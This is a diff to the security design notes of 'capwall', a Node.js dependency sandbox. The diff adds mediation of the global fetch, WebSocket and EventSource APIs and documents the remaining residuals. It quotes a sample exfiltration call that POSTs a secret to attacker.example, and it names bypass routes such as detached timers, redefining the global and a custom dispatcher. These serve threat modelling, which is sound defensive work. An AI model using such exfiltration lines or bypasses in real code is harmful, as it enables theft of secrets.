@@ -16,7 +16,10 @@ As of roadmap **M5**, all core capability surfaces are mediated on **both the CJ
 path and the ESM `import` path**: `fs`, `net`/`http`/`https`/`tls`/`http2`/`dgram`,
 `child_process`, `worker_threads`, `vm`, and `process.env`. Roadmap **S2** adds `native`, a
 load-time gate on `.node` addons that is module-system-independent (it patches
-`process.dlopen`, not a loader). ESM interception uses a
+`process.dlopen`, not a loader). Three surfaces are mediated **outside** both module systems,
+because they never route through one: `process.env` (a `Proxy` on the live object), the `native`
+gate above, and Node's **global egress APIs** — `globalThis.fetch`/`WebSocket`/`EventSource`,
+replaced on `globalThis` since #80 (see "Global egress surfaces" below). ESM interception uses a
 `module.register()` loader hook (`loader/esm-hook.ts` + `esm-hooks.ts` + `esm-runtime.ts`)
 that rewrites mediated builtin specifiers to a synthetic module re-exporting the same shims
 the CJS path uses; it covers **static AND dynamic** `import` (`import { readFile } from
@@ -63,7 +66,9 @@ The shims are handed out **mutable by default** (so `graceful-fs` and friends ke
 - **capwall cannot guarantee it stays outermost in the loader-hook chain** (#61). See
   "Loader-hook registration" below — this is the significant residual on the ESM path.
 - `process.env` is not import-routed; its Proxy guard (installed by `install()`) covers both
-  module systems already.
+  module systems already. The same is true of the **global egress guard** (#80) — `fetch`,
+  `WebSocket` and `EventSource` are globals, so they are mediated by replacing them on
+  `globalThis`, independently of either module system. See "Global egress surfaces" below.
 
 **Loader-hook registration (#61) — partially closed, residual named.** Node's module
 customization hooks are deliberately composable: the **most recently registered hook runs
@@ -128,7 +133,12 @@ Per-capability notes:
   requires (user/dependency code); Node's own HTTP client loads `net` through the internal
   bootstrap loader, which never hits `Module._load`, so one module's shim never covers
   another — and a dependency could otherwise bypass the control simply by choosing `tls`
-  (or `dgram`) over `net`. Inbound `server.listen` is not gated (capwall mediates who a
+  (or `dgram`) over `net`. **The same reason means there is no `net`-shim backstop behind
+  `fetch`** (verified empirically, not assumed): Node's global `fetch` dials through the internal
+  undici stack, which is bootstrap-loaded and never hits `Module._load`, so before #80 a
+  dependency's `fetch` under a deny-all `enforce` policy produced **no decision at all** — not a
+  denial, not a log line. That is why the global egress guard above exists as a separate
+  mechanism rather than as one more module shim. Inbound `server.listen` is not gated (capwall mediates who a
   package may *reach*, not that it may serve). IPC/unix-socket connects have no host:port and
   are approximated coarsely as `{ host: "<ipc>", port: 0 }`. `dgram` ops attributed to `<app>`
   are not gated (the app is the trust root, as for `process.env`); since #60 that requires a
@@ -286,17 +296,109 @@ are inert data (`fs.constants`, `http.METHODS`, `http.STATUS_CODES`, `tls.rootCe
 `http2.constants`, `vm.constants`, `worker_threads.resourceLimits`) or an already-shimmed
 sub-namespace (`fs.promises`).
 
-**Global egress surfaces are NOT mediated, and are not claimed to be.** capwall intercepts
-*module* surfaces — what `require`/`import` hands back. Node's built-in global egress APIs never
-route through a module load, so they are outside the mechanism entirely: `globalThis.fetch`,
-`globalThis.WebSocket` (and `http.WebSocket`, which on Node ≥22 is the same object re-exported
-onto the `http` namespace — shimming that copy alone would buy nothing), and `EventSource`. A
-dependency that calls `fetch("https://attacker.example/", {method:"POST", body: secret})` is
-neither gated nor logged. This is a real gap in egress coverage, not a determined-attacker
-residual: it needs no reflection and no knowledge of capwall. Until it is closed, treat capwall's
-egress control as covering the `net`/`http`/`https`/`tls`/`http2`/`dgram` module surfaces only,
-and pair it with network-level egress control (container/OS firewall) if the global APIs matter
-to your threat model.
+**Global egress surfaces are mediated as of #80 — but by a different mechanism, with its own
+limits.** Everything else capwall intercepts arrives through a module load: `require`/`import`
+hands back a shim. `fetch`, `WebSocket` and `EventSource` are **globals**, never imported, so the
+loader mechanism never sees them. Before #80 that was a plain gap, not a determined-attacker
+residual: a dependency calling
+`fetch("https://attacker.example/", {method:"POST", body: secret})` under a **deny-all `enforce`
+policy** exfiltrated successfully with **zero decisions recorded** (confirmed empirically during
+the #65 audit) — one line, no reflection, no `require` for a reviewer to grep for, and invisible
+to `observe`/`capwall diff` as well.
+
+capwall now installs a **global egress guard** (`shims/global-egress.ts`), which replaces those
+globals with guarded equivalents for the life of the install. What it covers and how it behaves:
+
+- **Which globals.** Enumerated against the supported range (Node 20.19 / 22.22 / 24.5, with and
+  without the relevant `--experimental-*` flags), not guessed: `fetch` (present everywhere),
+  `WebSocket` (Node ≥22 unflagged; `--experimental-websocket` on 20) and `EventSource`
+  (`--experimental-eventsource` on every supported version). Each is replaced **only if it is
+  already present**, so a flag-only API is picked up when the flag is on and nothing is invented
+  on a Node that lacks it. `navigator.sendBeacon` **does not exist in any supported Node** —
+  Node's `navigator` carries `userAgent`/`platform`/`language(s)`/`hardwareConcurrency` only — so
+  there is deliberately no guard code for it.
+- **How a FUTURE global egress API is caught.** `test/global-egress-inventory.test.ts` enumerates
+  `globalThis` in a clean child process and fails when a name appears that is in neither the
+  guarded list nor a reviewed-inert list, and separately asserts `navigator.sendBeacon` is still
+  absent. A new global cannot land in a Node minor release without breaking that test and forcing
+  someone to classify it. That test is the control; the table above is just its current state.
+- **`http.WebSocket`** (Node ≥22 re-exports the same class onto the `http` namespace) is guarded
+  too. While the global was un-mediated, shimming that copy bought nothing; now that the global is
+  guarded, the module copy would be the remaining one-liner. Note the one deviation: the two
+  guarded copies are not `===` to each other the way the real ones are. `instanceof` still answers
+  correctly for both.
+- **Policy shape: the existing `net` grant**, not a new capability. A dependency dialing
+  `example.com:443` holds the same authority whether it got there through `http.request`,
+  `net.connect` or `fetch`; splitting them would let a policy grant one and not the other by
+  accident. Every existing policy, `observe` trace, `gen-policy` output and `capwall diff` covers
+  the new surface with no schema change.
+- **Target derivation reuses the single-read pinning** the `net` shim uses (`shims/url-snapshot.ts`,
+  shared by both so they cannot drift). This is the #26/#56 TOCTOU class and both shapes were
+  verified to be exploitable without it: a `URL` whose `toString` answers differently on the second
+  read sends the request to the **second** value; and a `Request` with an OWN shadowed `url`
+  accessor reports whatever the attacker chose while undici dials the real internal URL — so the
+  guard reads a `Request`'s destination through the **real `Request.prototype.url` getter**, which
+  reaches the same state undici dials from and steps over the shadow. For strings and `URL`s,
+  capwall performs exactly one `String(input)` — the same conversion undici performs — and forwards
+  that immutable string, so there is no second read left to diverge.
+- **Attribution is unchanged and lands on the dependency.** The guard runs synchronously, on the
+  caller's own stack, before the first `await`, so a dependency's `fetch` is charged to that
+  dependency — not `<app>`, and not `<unknown>` (which would have forced every real app to grant
+  `<unknown>` just to use `fetch`). A dependency that detaches first
+  (`setTimeout(() => fetch(evil))`) is `<unknown>` and denied by default, exactly like every other
+  laundering shape since #60.
+- **A denial is delivered through the channel the real API uses**, same rule as `fs` (see
+  "Behavior change vs. real `fs`" below). Real `fetch` **never throws synchronously** — every
+  failure, including an unparseable URL or calling it with no arguments, arrives as a rejected
+  promise (verified on Node 20 and 22) — so a denied `fetch` **rejects** with a `CapabilityError`
+  rather than throwing, or `fetch(url).catch(handle)` would crash with an uncaught exception it
+  would never see from real `fetch`. `new WebSocket(…)` / `new EventSource(…)` *do* throw
+  synchronously on a bad argument, so a denial there throws, matching. The guard itself always
+  runs synchronously on the caller's stack; only the delivery of the outcome differs.
+- **`data:` and `blob:` are not gated** — they resolve in-process and move no bytes onto a network,
+  so gating them would deny-by-default an inert `fetch("data:…")`. Every other scheme IS gated,
+  including ones capwall does not recognize (fail-closed).
+- **`uninstall()` restores the originals** and leaves no capwall object on `globalThis`. The
+  replacement property is installed `configurable: true` **even under hardened mode**, because a
+  non-configurable global could never be restored by anyone — the same process-global constraint
+  that keeps real builtins unfrozen (#77) and that shaped #65's Proxy-view approach. Restoration is
+  skipped if something else replaced the global after capwall, so a later legitimate replacement is
+  not clobbered.
+- **Hardened mode (#17)** installs the guarded global `writable: false` (so `globalThis.fetch =
+  evil` silently no-ops in sloppy-mode CJS and throws under `"use strict"`) and freezes the wrapper
+  function / guarded class. `Object.defineProperty(globalThis, "fetch", …)` remains open — the same
+  class of residual as climbing past a guarded prototype, and the price of a restorable global.
+- **Switchable off**: `install(…, { globalEgress: false })` / `CAPWALL_GLOBAL_EGRESS=0`, for a
+  process where writing to `globalThis` is unacceptable.
+
+**Global egress residuals, named.**
+
+1. **Redirects are guarded only after the fact.** `redirect: "follow"` is fetch's default and the
+   following happens inside undici, where capwall has no interception point: by the time anything
+   is observable, the request — body included — has already reached the redirect target. capwall
+   guards the **final origin** on the response, so the hop is **recorded** (visible to `observe`,
+   `gen-policy` and `capwall diff`) and, in `enforce`, the response body is cancelled and the call
+   rejected with a `CapabilityError` rather than handing the dependency the attacker's reply. That
+   contains the *response*, not the request. Re-implementing redirect following on
+   `redirect: "manual"` was considered and rejected: `Response.url` and `Response.redirected` are
+   computed from internal state a userland re-issue cannot set, so every redirect-following `fetch`
+   in the process would start reporting `url: ""` / `redirected: false`, and 307/308 body replay is
+   not expressible for a stream body — a behavioral break on ordinary traffic in exchange for a hop
+   whose target the attacker does not choose. Intermediate hops in a chain are not visible at all;
+   only the final origin is.
+2. **`init.dispatcher`.** Node's `fetch` honors undici's non-standard `dispatcher` option, which
+   lets the caller supply the code that opens the socket — verified to be reachable with a plain
+   hand-rolled object. This is the same class as the `options.createConnection` residual already
+   documented for `http(s)`: capwall guards the target it derived, and a dispatcher that dials
+   elsewhere is only re-gated if the module it dials through is itself mediated (userland
+   dispatchers, including the npm `undici` package's, reach the network through `net`/`tls`, which
+   ARE mediated). capwall does not strip the option, because doing so would break legitimate
+   `ProxyAgent`/`MockAgent` interop.
+3. **Pre-install capture.** A module that captured `globalThis.fetch` before capwall installed
+   holds the raw function — the same residual as every other shim. Install via the `--import`
+   preload.
+4. **Undici does not route through the mediated modules**, so there is no `net`-shim backstop
+   behind any of this — see the note under `net`/`http` below.
 
 The earlier approach for some of those sites was a construct-trap `Proxy`, which **did not
 hold**: a `Proxy` forwards property reads to its target, so the proxied class's `.prototype`
@@ -413,9 +515,10 @@ When a package's declared capabilities are tight, capwall denies (in `enforce` m
 (in `observe` mode) attempts by that package to:
 
 - Read/write files outside its allowed path globs (`fs`).
-- Open network connections to hosts/ports outside its allowlist **through the `net`, `http(s)`,
-  `tls`, `http2` and `dgram` module surfaces**. Node's global egress APIs (`fetch`, `WebSocket`)
-  are *not* mediated — see "Global egress surfaces" above.
+- Open network connections to hosts/ports outside its allowlist — through the `net`, `http(s)`,
+  `tls`, `http2` and `dgram` **module** surfaces, and (since #80) through the **global** APIs
+  `fetch`, `WebSocket` and `EventSource`. All of them evaluate against the same `net` grant. See
+  "Global egress surfaces" above for the global guard's own limits, chiefly redirects.
 - Spawn subprocesses when `child_process` is not permitted (**gating** the spawn).
 - Spin up `worker_threads` when not permitted.
 - Read `process.env` keys outside its allowlist (e.g. exfiltrating `AWS_SECRET_ACCESS_KEY`
@@ -455,9 +558,13 @@ frozen primordials, a **determined in-process attacker** can defeat it via, amon
   path specifically, **hijacking the loader-hook chain** is a second route with the same
   disables-it-for-everyone property; it is now gated and logged rather than silent, but not
   closed — see "Loader-hook registration (#61)" above for exactly what remains.
-- **Global egress APIs** — `fetch`, `WebSocket` and friends are globals, not module exports, so
-  the loader-interception mechanism never sees them. See "Global egress surfaces" above; this
-  one is cheap for an attacker, unlike most entries on this list.
+- **Global egress APIs** — `fetch`, `WebSocket` and `EventSource` are globals, not module
+  exports, so the loader-interception mechanism never sees them. They are now mediated by a
+  separate `globalThis` guard (#80), which closes the plain gap this bullet used to describe. What
+  is left is narrower and named under "Global egress surfaces" above: **redirect hops are guarded
+  only after the request has gone out**, `init.dispatcher` can supply the dialing code (re-gated
+  only where it dials through a mediated module), a pre-install capture holds the raw function,
+  and the guarded global is replaceable unless hardened mode is on.
 - **fd / symlink escapes** — using an already-open file descriptor, or a symlink, to reach a
   path outside the allowed globs.
 - **`vm` / `eval` / `node:sqlite`** and similar reflective or alternate-execution surfaces
@@ -552,6 +659,13 @@ of enforcement **for the whole process** (the un-patching bullet above). Hardene
   that reads the frozen class and writes to a new one.
 - The guarded `send`/`connect` own-properties capwall installs on a `dgram` socket instance
   (made non-writable/non-configurable; the socket itself is not frozen — it needs its state).
+- The **guarded global egress surfaces** (#80): `globalThis.fetch`/`WebSocket`/`EventSource` are
+  installed **non-writable**, so `globalThis.fetch = evil` fails, and the guarded wrapper /
+  subclass is frozen. They stay **`configurable`** on purpose — a non-configurable global could
+  never be restored by `uninstall()`, which would leave a permanent process-wide mutation. So
+  `Object.defineProperty(globalThis, "fetch", …)` still un-gates them; that is the deliberate
+  price of a restorable global, and it is the same class of escape as climbing past a guarded
+  prototype.
 
 Note the dependency on issue #64: while `fs.ReadStream`, `vm.Script` and
 `worker_threads.Worker` were construct-trap Proxies, hardened mode could not freeze them at
